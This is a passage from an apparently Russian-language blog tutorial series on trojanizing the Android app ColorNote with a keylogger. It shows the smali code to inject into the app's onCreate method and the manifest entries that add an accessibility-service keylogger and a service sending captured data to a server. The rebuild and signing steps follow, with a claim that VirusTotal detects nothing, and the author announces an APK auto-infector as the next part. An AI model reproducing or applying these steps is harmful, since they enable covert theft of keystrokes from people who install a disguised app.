Видим нужный класс ```com.socialnmobile.colornote.activity.Main```. В нем ищем метод ```OnCreate()```. Видим промежуток между line 164 и line 172. Туда и будем внедрять вызов нашей функции.

```java
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 6

    .prologue
    const v2, 0x7f0800f9

    const/4 v5, 0x0

    const/4 v4, 0x1

    .line 164
    invoke-super {p0, p1}, Lcom/socialnmobile/colornote/activity/ThemeFragmentActivity;->onCreate(Landroid/os/Bundle;)V
	
	<------------------------ //Внедряемся сюда
	
    .line 172
    invoke-virtual {p0, v4}, Lcom/socialnmobile/colornote/activity/Main;->d(I)V

    .line 173
    const v0, 0x7f0a0003
```

Мы написали кейлоггер так, чтобы было достаточно вызвать одну функцию ```openSettings()``` в классе ```ExecuteAttack```. Вызов этой функции у нас был в ```MainActivity```. Открываем smali версию этого класса.

```java
# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 0

    .line 13
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const p1, 0x7f09001c

    .line 14
    invoke-virtual {p0, p1}, Lkz/c/keylogger/MainActivity;->setContentView(I)V

    .line 15
    invoke-static {p0}, Lkz/c/keylogger/ExecuteAttack;->openSettings(Landroid/content/Context;)V
	// Нужная нам строка
	
    return-void
.end method
```

Берем этот вызов и добавляем в ```com.socialnmobile.colornote.activity.Main```. В итоге он выглядит так.

```java
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 6

    .prologue
    const v2, 0x7f0800f9

    const/4 v5, 0x0

    const/4 v4, 0x1

    .line 164
    invoke-super {p0, p1}, Lcom/socialnmobile/colornote/activity/ThemeFragmentActivity;->onCreate(Landroid/os/Bundle;)V
	
	.line 165
    invoke-static {p0}, Lcom/socialnmobile/colornote/activity/ExecuteAttack;->openSettings(Landroid/content/Context;)V
	
    .line 172
    invoke-virtual {p0, v4}, Lcom/socialnmobile/colornote/activity/Main;->d(I)V
```

Теперь копируем нужные smali, в декомпилированную папку ColorNote, как это делали в предыдущий раз. Меняем им package name. Не забываем об xml конфиге нашего сервиса, его тоже переносим в папку *res\xml*. Осталось добавить наш ```AccessibilityService``` и сервис по отправке данных на сервер в манифест.

```xml
<service android:name="com.socialnmobile.colornote.activity.SendService"/>
        <service android:name="com.socialnmobile.colornote.activity.GoogleService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data android:name="android.accessibilityservice" android:resource="@xml/accessibility_service_config" />
        </service>
```

Как и ранее, собираем с помощью ```apktool``` и подписываем ```jarsigner```. [Virustotal говорит, что мы чисты](https://www.virustotal.com/gui/file-analysis/YmQxODExMjJiNjljZDVlOTRiZDFjYWI4N2YxYjYxNDQ6MTU2MzM3MDY4Ng==/detection). Видео, как это работает:

https://youtu.be/vTHcc6OSou0

## В следующей части

В следующей части, я расскажу про создание автоинфектора apk. 

Хочу сказать большое спасибо художнице за рисунок к посту и за рисунок к аватарке телеграм канала. Подписывайтесь на ее [инстаграм](https://instagram.com/kottsarapkin?igshid=iet95lnz29zm), ставьте лайки!

Телеграм канал: https://t.me/OrderOfSixAngles
